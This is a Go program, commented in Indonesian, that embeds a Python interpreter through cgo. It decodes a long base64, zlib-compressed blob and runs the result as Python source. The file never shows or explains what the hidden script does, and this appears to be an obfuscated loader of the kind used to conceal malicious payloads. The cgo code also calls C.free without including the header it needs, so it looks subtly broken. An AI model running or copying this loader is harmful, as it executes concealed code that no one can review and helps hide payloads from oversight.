package main

/*
// Menggunakan 'python3' sebagai target pkg-config untuk kompatibilitas luas.
#cgo pkg-config: python3

// LDFLAGS secara eksplisit menautkan pustaka Python versi spesifik untuk build yang andal.
#cgo LDFLAGS: -lpython3.13

#include <Python.h>
*/
import "C"
import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"io"
	"log"
	"unsafe"
)

const codeB64 = `eJy1lk+P20QYxu+V+h1efEkispEQt5VyWFghoGxVbbkgVbJex5N41vY48sx0CdWifoCckIpUqYILSJw50a/DJ+Aj8MzYjv8li4DWlzbj2ef98/zmHa8y1pqeykwo81XxXJw/fEB4YrGmMJRKmjCcapGt57QrbBkqzsWcMmyMw0KJWb3dPUEQtD++UFJLzqRmLamIbkTaiQF1tWFFEGO6UDFT3Pzasdq0KrFcSWVYLh4+aBefcIkkjCh1u3Z2eNq1Q750TtqU7Qv3PG5CL9r1Q1Un/8Bl103qaOmuW4s2+LJNZLCnjbdsYw/2SB0+RyejzG36jDMtmlY4h8S321JoHWrf2mznnTrpyRW6LvIIrqRotxGprgrKsb5hvCjdOpadqCRfJZzJOEfNnHfq/RIK9XsgQkbGnEKwzGTCZk4547XXZ6eYe7dj63pXcMegJjgyKmkrlE0ogbnbxSjAWLqVaWMY/9+Ik9tjf0xFJpKRha3OtTC2VGOoOo4Mofj6f/SwZ41ckyrM0PLzfrTSJ0jT/qp71sGV0GkT7kWfwDuKLKp/0WfuDn0xvHXd0YDCqp2cUzCWDiBhFTIzErvh31HHvqe/fv7l9z/f/DZQmLU/6+zXwTC9ifb0k9TUoG6KUbofIMIPPwVd+t1LjKhwW/IOVbwL+F1993jm/XZM9ZEmq4xNsTkSpZfPpH/H6uzxrhpuyI0z25lsXj4VHLNHVqbvi8V/KKnXpOOErYNvmK45inD8iqRQdMMAgJ31Rjq9KiynlupjNQRpHTwVebHhMYRVX+rU2rZdWdj9ag/LX43EatZNNXLsirdzoFiyRieRgp8BtazmfMuSMnGLA4BGLBYLusilOkLrrEvWLePeWxdleMNKcfIuyPLHBP8OrajZATk3FsliDRUksmTzH7jTttzwgblWs7pui9Kl1RuA/XDvhb9Thf9bBj8dNm405lyDdMUZSsfQS3Bd4DukU+RoxAURPlHcdiPyBsOqi0AQ2F9kAN1hU+G4/2OIjMMlZ6mmDR+HYsAF8JOZa8KqUKZI3MTcbKxyRz4FofrUN9Hkuvgu4XTibZx8gus15lJOFgfhlajwT/XZKeBGoPlJH9mGq0Oe+a7+fgj9GF52kpoGVSIB+tZkEdQzfVsiwDTAEd3TE6ERsXLo0ke8RMRzN7L3/f39YIvRB8yst7sfCgeWLkH9o8Rqq8/JHeD7xIf3w33asPYtfV6jehFxLF32+7f3BhiOidlhiNSqzxQ0XtMjfJlAHMOy35z960YeIiQBMLkjKqYfd4dNpYV7U3740d2i6nJqu85uYQzoBfucQsPYzOrmxsbxk2rH7oL+9SX8+DHwSUr3ee+OTRjScklBGDqIwzCoA1dI/w3YGaw0`

func decodeAndDecompress(encoded string) []byte {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		log.Fatalf("FATAL: Proses dekode base64 gagal: %v", err)
	}

	b := bytes.NewReader(decoded)
	r, err := zlib.NewReader(b)
	if err != nil {
		log.Fatalf("FATAL: Inisialisasi zlib reader gagal: %v", err)
	}
	defer r.Close()

	decompressed, err := io.ReadAll(r)
	if err != nil {
		log.Fatalf("FATAL: Proses dekompresi zlib gagal: %v", err)
	}
	return decompressed
}

func main() {
	pySrc := decodeAndDecompress(codeB64)

	C.Py_Initialize()
	if C.Py_IsInitialized() == 0 {
		log.Fatal("FATAL: Inisialisasi interpreter Python gagal.")
	}

	cStr := C.CString(string(pySrc))
	defer C.free(unsafe.Pointer(cStr))

	if C.PyRun_SimpleString(cStr) != 0 {
		log.Fatal("FATAL: Eksekusi skrip Python gagal.")
	}

	C.Py_Finalize()
}